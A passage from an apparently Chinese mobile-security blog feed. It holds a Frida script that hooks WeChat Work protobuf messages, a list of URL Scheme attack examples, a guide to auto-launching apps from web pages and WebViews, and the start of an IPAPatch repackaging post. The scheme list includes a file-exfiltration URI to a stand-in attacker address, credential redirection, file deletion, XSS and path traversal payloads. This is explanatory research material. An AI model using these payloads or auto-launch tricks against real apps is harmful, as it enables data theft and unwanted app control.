class="line">preview_img_md5: &quot;3648cc2101f076f4e4a1a3ad47958d64&quot;</span><br><span class="line">preview_img_size: 10318</span><br><span class="line">preview_img_url: &quot;/storage/emulated/0/Tencent/WeixinWork/tempimagecache/1688851907317093/video_thumb/6a362d3586f5bd8e07472a543ecd37d0_thumb.wwdata&quot;</span><br><span class="line">random_key: &quot;&quot;</span><br><span class="line">session_id: &quot;&quot;</span><br><span class="line">size: 1029481</span><br><span class="line">thumbnail_file_id: &quot;&quot;</span><br><span class="line">url: &quot;/storage/emulated/0/DCIM/WeixinWork/mmexport1526034101689.mp4&quot;</span><br><span class="line">video_duration: 5</span><br><span class="line">video_height: 1280</span><br><span class="line">video_id: &quot;3069020102046230600201000204cf40798d02030f424202042a8dcf8c02045af56eb7042430626334356235372d316161322d346363362d393831312d37643232396236373362393102010002030fb57004104b49f7136f83d563c08a0fce5d7d61d00201040201000400&quot;</span><br><span class="line">video_width: 720</span><br><span class="line">wechat_auth_key: &quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="其他消息"><a href="#其他消息" class="headerlink" title="其他消息"></a>其他消息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">WwRichmessage.pOSTSHAREDMESSAGE = Extension.createMessageTyped(11, PostSharedMessage.class, 810);</span><br><span class="line">WwRichmessage.cARDSHAREDMESSAGE = Extension.createMessageTyped(11, BusinessCardShareMessage.class, 818);</span><br><span class="line">WwRichmessage.aTTENDANCESHAREDMESSAGE = Extension.createMessageTyped(11, AttendanceRecordShareMessage.class, 826);</span><br><span class="line">WwRichmessage.wORKLOGSHAREDMESSAGE = Extension.createMessageTyped(11, WorkLogRecordShareMessage.class, 834);</span><br><span class="line">WwRichmessage.aPPROVALSHAREDMESSAGE = Extension.createMessageTyped(11, ApprovalShareMessage.class, 842);</span><br><span class="line">WwRichmessage.wORKLOGSHAREDMESSAGEV2 = Extension.createMessageTyped(11, WorkLogRecordShareMessage.class, 850);</span><br><span class="line">WwRichmessage.wEAPPMESSAGE = Extension.createMessageTyped(11, WeAppMessage.class, 858);</span><br><span class="line">WwRichmessage.rICHMESSAGE = Extension.createMessageTyped(11, RichMessage.class, 810);</span><br><span class="line">WwRichmessage.vIDEOMESSAGE = Extension.createMessageTyped(11, VideoMessage.class, 818);</span><br><span class="line">WwRichmessage.fILEMESSAGE = Extension.createMessageTyped(11, FileMessage.class, 826);</span><br><span class="line">WwRichmessage.lOCATIONMESSAGE = Extension.createMessageTyped(11, LocationMessage.class, 834);</span><br><span class="line">WwRichmessage.lINKMESSAGE = Extension.createMessageTyped(11, LinkMessage.class, 842);</span><br><span class="line">WwRichmessage.eMOTIONMESSAGE = Extension.createMessageTyped(11, EmotionMessage.class, 850);</span><br><span class="line">WwRichmessage.fORWARDMESSAGES = Extension.createMessageTyped(11, ForwardMessages.class, 858);</span><br><span class="line">WwRichmessage.iNVITEMESSAGE = Extension.createMessageTyped(11, InviteMessage.class, 8010);</span><br><span class="line">WwRichmessage.aPPMESSAGE = Extension.createMessageTyped(11, AppMessage.class, 8026);</span><br><span class="line">WwRichmessage.iNVITEMEMBERENTERMESSAGE = Extension.createMessageTyped(11, InviteMemberEnterMessage.class, 8042);</span><br><span class="line">WwRichmessage.aPPTEVENTMESSAGE = Extension.createMessageTyped(11, ApptEventMessage.class, 8106);</span><br><span class="line">WwRichmessage.iTILHBINVITEMESSAGE = Extension.createMessageTyped(11, ItilHBInviteMessage.class, 8130);</span><br><span class="line">WwRichmessage.aPPMARKETINFOMESSAGE = Extension.createMessageTyped(11, AppMarketInfoMessage.class, 8138);</span><br><span class="line">WwRichmessage.cOMMONTIBCARDMESSAGE = Extension.createMessageTyped(11, CommonTitleImgBtnCardMessage.class, 8154);</span><br></pre></td></tr></table></figure><h2 id="Frida-hook代码"><a href="#Frida-hook代码" class="headerlink" title="Frida hook代码"></a>Frida hook代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function  add_hook(func)&#123;</span><br><span class="line"></span><br><span class="line">    var xxx_message = Java.use(func);</span><br><span class="line">    var super_class = xxx_message.class.getSuperclass();</span><br><span class="line">    if(super_class == null) return;</span><br><span class="line">    if(super_class.getName().indexOf(&quot;com.google.protobuf.nano.ExtendableMessageNano&quot;) &lt; 0) return;</span><br><span class="line">    console.log(xxx_message.class.getSuperclass(),func)</span><br><span class="line">    xxx_message.writeTo.implementation = function (arg)&#123;</span><br><span class="line">        console.log(&quot;=============  &quot;+func + &quot; call writeTo  =============&quot;);</span><br><span class="line">        console.log(this.toString());</span><br><span class="line">        return this.writeTo(arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xxx_message.parseFrom.overload(&apos;[B&apos;).implementation = function (arg)&#123;</span><br><span class="line">        console.log(&quot;=============  &quot;+func + &quot;call parseFrom byte[]  =============&quot;);</span><br><span class="line">        var x = this.parseFrom(arg);</span><br><span class="line">        console.log(x.toString());</span><br><span class="line">        return x;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    xxx_message.parseFrom.overload(&apos;com.google.protobuf.nano.CodedInputByteBufferNano&apos;).implementation = function (arg)&#123;</span><br><span class="line">        console.log(&quot;=============  &quot;+func+&quot; call parseFrom  [inputbuffer]  =============&quot;);</span><br><span class="line">        var x = this.parseFrom(arg);</span><br><span class="line">        console.log(x.toString());</span><br><span class="line">        return x;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Java.enumerateLoadedClasses(&#123;</span><br><span class="line">    onMatch: function(classname) &#123;</span><br><span class="line">               if(classname.indexOf(&quot;com.tencent.wework.foundation.model.pb&quot;)&gt;-1)&#123;</span><br><span class="line">              //console.log(classname);</span><br><span class="line">              classname = classname.replace(&quot;[L&quot;,&quot;&quot;);</span><br><span class="line">              classname = classname.replace(&quot;;&quot;,&quot;&quot;);</span><br><span class="line">              add_hook(classname);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    onComplete: function() &#123;&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>URL Scheme安全漏洞案例</title>
      <link href="/2018/05/06/URL-Scheme%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B/"/>
      <url>/2018/05/06/URL-Scheme%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<ul><li><p>URL Scheme可能存在的问题</p><ol><li>调起内部敏感组件或数据<br>myapp://cmd/run?program=/path/to/program/to/run</li><li>直接更改内部配置<br>myapp://cmd/set_preference?use_ssl=false</li><li>泄露内部敏感文件<br>myapp://cmd/sendfile?to=evil@attacker.com&amp;file=some/data/file</li><li>删除某些敏感文件<br>myapp://cmd/delete?data_to_delete=my_document_ive_been_working_on</li><li>泄露凭据信息<br>myapp://cmd/login_to?server_to_send_credentials=malicious.webserver.com</li><li>未过滤数据导致的xss<br>myapp://cmd/adduser=’&gt;”&gt;<script>javascript to run goes here</script></li><li>目录穿越<br>myapp://use_template?template=/../../../../../../../../some/other/file</li></ol></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> iOS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Web调起APP研究</title>
      <link href="/2018/04/28/Web%E8%B0%83%E8%B5%B7APP%E7%A0%94%E7%A9%B6/"/>
      <url>/2018/04/28/Web%E8%B0%83%E8%B5%B7APP%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>应用开发中经常会有从web端启动App的需求，这里总结了常见的几种方式。</p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="0x0-自定义scheme"><a href="#0x0-自定义scheme" class="headerlink" title="0x0 自定义scheme"></a>0x0 自定义scheme</h2><p>Android上常用的是通过scheme协议的方式唤醒本地app客户端。即App在AndroidManifest.xml中为要打开的Activity注册一个intent-filter,添加scheme,并注明host和data等关键字段，前端保持一致后就可以实现在Web页中调起本地App了。</p><p>注册scheme的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt;</span><br><span class="line">  &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;</span><br><span class="line">  &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;</span><br><span class="line">  &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;</span><br><span class="line">  &lt;!--BROWSABLE指定该Activity能被浏览器安全调用--&gt;</span><br><span class="line">  &lt;data android:host=&quot;xyz.com&quot; android:scheme=&quot;m4bln&quot;/&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure></p><p>这里的action、category、data都必须完全匹配才能获得intent，android.intent.category.DEFAULT是默认的，有实际意义的是android.intent.category.BROWSABLE，表示允许通过浏览器启动该activity（调起App）。data限定了触发条件，当scheme为m4bln且host为xyz.com时才匹配，例如浏览器访问m4bln://xyz.com，能够匹配成功，App就起来了。</p><h2 id="0x1-Web页打开App"><a href="#0x1-Web页打开App" class="headerlink" title="0x1 Web页打开App"></a>0x1 Web页打开App</h2><p>通过Web页打开App有多种方式，打开方式也因直接在浏览器打开和在webview中打开而异，这里分别进行尝试：</p><h4 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;m4bln://xyz.com&quot;&gt;打开App&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.location.href=&quot;m4bln://xyz.com&quot;</span><br></pre></td></tr></table></figure><h4 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;m4bln://xyz.com&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>注意：<br>安卓chrome 浏览器version 25之后版本发生了改变。不能在通过设置iframe标签的src属性来启动app了。取而代之的是<strong>通过自定义scheme实现用户手势启动app或者使用Chrome Intent语法（参考下文）</strong></p><p>这里我们对比在浏览器中和webview中打开页面的情况：</p><h3 id="浏览器中打开"><a href="#浏览器中打开" class="headerlink" title="浏览器中打开"></a>浏览器中打开</h3><p>根据<a href="https://developer.chrome.com/multidevice/android/intents" target="_blank" rel="noopener">官方文档</a>, Chrome浏览器在通过自定义Scheme唤起App的时候，需要绑定用户的点击事件触发，而在浏览器地址栏里直接输入是不可以的。</p><p>因此，当我们想要用户打开网页就直接进入App时，在Chrome浏览器地址栏里直接输是无法实现的，但可以通过其他方式实现，例如绑定所有的事件，让用户碰一下屏幕还是可以轻松做到的，参考自动写入剪贴板的实现，而通过点击url的方式则可以自动唤起App。</p><p>例如，用户点开短信中的url,此时无需用户点击便可以自动唤起App。（参考之前对于支付宝的克隆攻击Demo）</p><p>WebView中自动唤起App实现代码可能如下：</p><ol><li><p>对于a标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;a&quot; href=&quot;m4bln://xyz.com&quot;&gt;打开App&lt;/a&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload=function()&#123;</span><br><span class="line">document.getElementById(&quot;a&quot;).click();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>对于location.href</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.onload=function()&#123;</span><br><span class="line">document.location.href=&quot;m4bln://xyz.com&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="WebView中打开"><a href="#WebView中打开" class="headerlink" title="WebView中打开"></a>WebView中打开</h3><p>在webview中，直接通过loadurl(“m4bln://xyz.com”)是无法打开App的，需要使用shouldOverrideUrlLoading和shouldInterceptRequest进行拦截和处理。</p><p>注：<br><strong><br>shouldOverrideUrlLoading 用于拦截页面切换<br>shouldInterceptRequest 拦截所有的资源请求，例如css,js,iframe</strong></p><blockquote><p>shouldOverrideUrlLoading is called when a new page is about to be opened whereas shouldInterceptRequest is called each time a resource is loaded like a css file, a js file etc</p></blockquote><p>因此，对于a标签或document.location都属于页面切换类型，所以用shouldOverrideUrlLoading来实现处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">wv.setWebViewClient(new WebViewClient()&#123;</span><br><span class="line">/*</span><br><span class="line">注： 在Android N中 shouldOverrideUrlLoading(WebView view, String url)被废弃，改为shouldOverrideUrlLoading(WebView view, WebResourceRequest request),通过request.getUrl()来获取url。</span><br><span class="line">@Override</span><br><span class="line">public boolean shouldOverrideUrlLoading(WebView view, String url) &#123;</span><br><span class="line">        if(你想在当前页面打开新连接)&#123;</span><br><span class="line">            view.loadUrl(url);</span><br><span class="line">        &#125;else if(在一个新的activity中打开新连接)&#123;</span><br><span class="line">            Intent intent = new Intent(mContext, NewWebViewActivity.class);</span><br><span class="line">            intent.putputExtra(&quot;URL&quot;, url);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line">public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) &#123;</span><br><span class="line">    String url=&quot;&quot;;</span><br><span class="line">    try&#123;</span><br><span class="line"></span><br><span class="line">        url = request.getUrl().toString();</span><br><span class="line">        if(url.startsWith(&quot;m4bln://&quot;))&#123;</span><br><span class="line">            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));</span><br><span class="line">            startActivity(intent);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;catch (Exception e)&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    view.loadUrl(url);</span><br><span class="line">    return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>而对于iframe，上文中虽然提到在浏览器中无法达到目的，但在webview中可以通过shouldInterceptRequest来实现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">注： shouldInterceptRequest(WebView view, String url)同样被废弃，这里不再描述</span><br><span class="line">*/</span><br><span class="line">@Override</span><br><span class="line">public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) &#123;</span><br><span class="line">    </span><br><span class="line">    String scheme = request.getUrl().getScheme();</span><br><span class="line">    if (scheme.equals(&quot;m4bln&quot;)) &#123;</span><br><span class="line">        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(request.getUrl().toString()));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;    </span><br><span class="line">    return super.shouldInterceptRequest(view, request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>webview完成上述设置后，使用webview加载web页面，均可以实现一启动便自动唤起对应的App。</p><p>需要注意的是：</p><ol><li><p><strong>不是使用webview.loadurl(“m4bln://xyz.com”)直接加载scheme,loadurl加载的是和上述浏览器部分相同的web页。</strong></p></li><li><p><strong>如果webview没有作相应的设置，是无法再通过scheme打开其他App的</strong></p></li><li><p><strong>有人曾经想过利用自定义scheme实现App之间的一个循环启动，实现loop还得取决于App中的webview是如何配置的</strong></p></li><li><p><strong>App的webview里利用自己的scheme唤起自己确实会导致死循环</strong></p></li></ol><h2 id="0x2-Chrome-Intent"><a href="#0x2-Chrome-Intent" class="headerlink" title="0x2 Chrome Intent"></a>0x2 Chrome Intent</h2><p>为了更有序的打通浏览器页面和本地应用推出了Chrome Intent机制，作为标准协议进行推广，其格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">intent:</span><br><span class="line">   HOST/URI-path // Optional host </span><br><span class="line">   #Intent; </span><br><span class="line">      package=[string]; </span><br><span class="line">      action=[string]; </span><br><span class="line">      category=[string]; </span><br><span class="line">      component=[string]; </span><br><span class="line">      scheme=[string]; </span><br><span class="line">   end;</span><br></pre></td></tr></table></figure></p><p>当打开本地App失败的时候，还可以使用如下代码重定向到一个新页面，例如App下载页等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S.browser_fallback_url=[encoded_full_url]</span><br></pre></td></tr></table></figure></p><p>S.<name>用来传递string类型的参数，i.<name>用来传递整数类型参数，例如：</name></name></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">intent://foobar/#Intent;action=myaction;type=text/plain;S.xyz=123;i.abc=678;end</span><br><span class="line">  </span><br><span class="line">其他参数类型如下：</span><br><span class="line">String =&gt; &apos;S&apos;  </span><br><span class="line">Boolean =&gt;&apos;B&apos;  </span><br><span class="line">Byte =&gt; &apos;b&apos;  </span><br><span class="line">Character =&gt; &apos;c&apos;  </span><br><span class="line">Double =&gt; &apos;d&apos;  </span><br><span class="line">Float =&gt; &apos;f&apos;  </span><br><span class="line">Integer =&gt; &apos;i&apos;  </span><br><span class="line">Long =&gt; &apos;l&apos;  </span><br><span class="line">Short =&gt; &apos;s&apos;</span><br></pre></td></tr></table></figure><p>对于上述例子，我们构造intent为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent://xyz.com#Intent;scheme=m4bln;package=com.m4bln.webviewgps;S.browser_fallback_url=https%3A%2F%2Fwww.baidu.com;end</span><br></pre></td></tr></table></figure></p><p>需要注意的是：</p><ol><li><p>package、action等字段非必须，取决于应用的AndroidMenifest.xml配置，上述例子中使用”intent://xyz.com#Intent;scheme=m4bln;end”也可以成功唤起App.(参照Android源码中对intent://的解析 <a href="http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/content/Intent.java#5044" target="_blank" rel="noopener">http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/content/Intent.java#5044</a>)</p></li><li><p>除了intent://，intent:，android-app://可以达到同样效果，同样参照源码</p></li><li><p>仅有Chrome支持这种方式，部分国产浏览器屏蔽了intent://这种scheme</p></li><li><p>Chrome Intent同样需要用户点击事件, “#Intent”中的“I”必须为大写！！！</p></li><li><p>Chrome Intent在webview里不支持，同样需要shouldInterceptRequest等来处理</p></li></ol><h3 id="App获取Web传参"><a href="#App获取Web传参" class="headerlink" title="App获取Web传参"></a>App获取Web传参</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    //...</span><br><span class="line"></span><br><span class="line">    // 获取uri参数</span><br><span class="line">    Intent intent = getIntent();</span><br><span class="line">    String scheme = intent.getScheme();</span><br><span class="line">    Uri uri = intent.getData();</span><br><span class="line">    String str = &quot;&quot;;</span><br><span class="line">    if (uri != null) &#123;</span><br><span class="line">        String host = uri.getHost();</span><br><span class="line">        String dataString = intent.getDataString();</span><br><span class="line">        String from = uri.getQueryParameter(&quot;from&quot;);</span><br><span class="line">        String path = uri.getPath();</span><br><span class="line">        String encodedPath = uri.getEncodedPath();</span><br><span class="line">        String queryString = uri.getQuery();</span><br><span class="line"></span><br><span class="line">        //...根据uri判断打开哪个页，或者打开哪个功能</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x3-App监听本地特定端口"><a href="#0x3-App监听本地特定端口" class="headerlink" title="0x3 App监听本地特定端口"></a>0x3 App监听本地特定端口</h2><p>参照WormWhole漏洞（<a href="http://www.freebuf.com/vuls/83789.html）" target="_blank" rel="noopener">http://www.freebuf.com/vuls/83789.html）</a></p><h1 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h1><h2 id="0x0-自定义Scheme"><a href="#0x0-自定义Scheme" class="headerlink" title="0x0 自定义Scheme"></a>0x0 自定义Scheme</h2><p>在Info.plist中配置Scheme</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;key&gt;CFBundleURLTypes&lt;/key&gt;</span><br><span class="line">&lt;array&gt;</span><br><span class="line">&lt;dict&gt;</span><br><span class="line">&lt;key&gt;CFBundleURLName&lt;/key&gt;</span><br><span class="line">&lt;string&gt;com.xyz&lt;/string&gt;</span><br><span class="line">&lt;key&gt;CFBundleURLSchemes&lt;/key&gt;</span><br><span class="line">&lt;array&gt;</span><br><span class="line">&lt;string&gt;m4bln&lt;/string&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;/dict&gt;</span><br><span class="line">&lt;/array&gt;</span><br></pre></td></tr></table></figure><h2 id="0x1-Universal-links"><a href="#0x1-Universal-links" class="headerlink" title="0x1 Universal links"></a>0x1 Universal links</h2><p>Universal links为iOS9上一个所谓通用链接的深层链接特性，一种能够方便的通过传统HTTP链接来启动app，使用相同的网址打开网站和app；通过唯一的网址，就可以链接一个特定的视图到你的app里面，不需要特别的scheme。</p><ol><li>通过scheme启动app时，浏览器会弹出确认框提示用户是否打开，Universal links不会提示，体验更好；</li><li>Universal links可在微信浏览器中打开外部app</li></ol><p>参考资料：</p><ol><li><a href="https://developer.chrome.com/multidevice/android/intents" target="_blank" rel="noopener">Chrome官方文档</a></li><li><a href="https://developer.android.com/reference/android/webkit/WebViewClient" target="_blank" rel="noopener">shouldoverrideurlloading和shouldinterceptrequest区别</a></li><li><a href="http://www.ayqy.net/blog/android-scheme%E5%91%BC%E8%B5%B7app/" target="_blank" rel="noopener">Android scheme呼起App</a></li><li><a href="http://blog.devzeng.com/blog/ios-url-scheme.html" target="_blank" rel="noopener">iOS中的URL Scheme</a> </li><li><a href="https://www.jianshu.com/p/1970fd59de12" target="_blank" rel="noopener">iOS Universal Links(通用链接)的使用</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>iOS应用安全—— IPAPatch免越狱调试、修改第三方App</title>
      <link href="/2018/04/17/%E4%BD%BF%E7%94%A8IPAPatch%E5%85%8D%E8%B6%8A%E7%8B%B1%E8%B0%83%E8%AF%95%E3%80%81%E4%BF%AE%E6%94%B9%E7%AC%AC%E4%B8%89%E6%96%B9App/"/>
      <url>/2018/04/17/%E4%BD%BF%E7%94%A8IPAPatch%E5%85%8D%E8%B6%8A%E7%8B%B1%E8%B0%83%E8%AF%95%E3%80%81%E4%BF%AE%E6%94%B9%E7%AC%AC%E4%B8%89%E6%96%B9App/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>IPAPatch可以实现免越狱调试、修改第三方APP,其原理主要是基于砸壳的APP进行修改和签名，并安装在真机设备上，类似于重打包。</p><p>项目地址：<a href="https://github.com/Naituw/IPAPatch" target="_blank" rel="noopener">https://github.com/Naituw/IPAPatch</a></p><p>IPAPatch基于Xcode实现，整个过程在 Xcode 中进行，就像在编写自己的 App，此外：</p><ul><li>支持链接第三方 Framework</li><li>在 Xcode 中可以直接断点进行调试，可以用 lldb 命令（如 po），输出运行时信息</li><li>可以使用 Xcode 的调试功能查看 View Hierarchy、Memory Graph 等信息</li><li>修改过的 App 可以与原始 App 共存，并自动修改名字以作区分</li></ul><h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>主要的自动化过程在 patch.sh 这个脚本里，Xcode 会在把代码编译成 Framework 后执行这个脚本：</p><ol><li>解压 IPA 文件</li><li>用 IPA 文件的内容，替换掉 Xcode 生成的 .app 的内容</li><li>通过 OPTOOL，将代码生成的 Framework 及其他外部 Framework，注入到二进制文件中</li><li>对这些文件进行重新签名 完成后，Xcode 会自动将修改过的 .app 安装到 iPhone 上</li></ol><p>patch.sh的注释中写的很明确：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 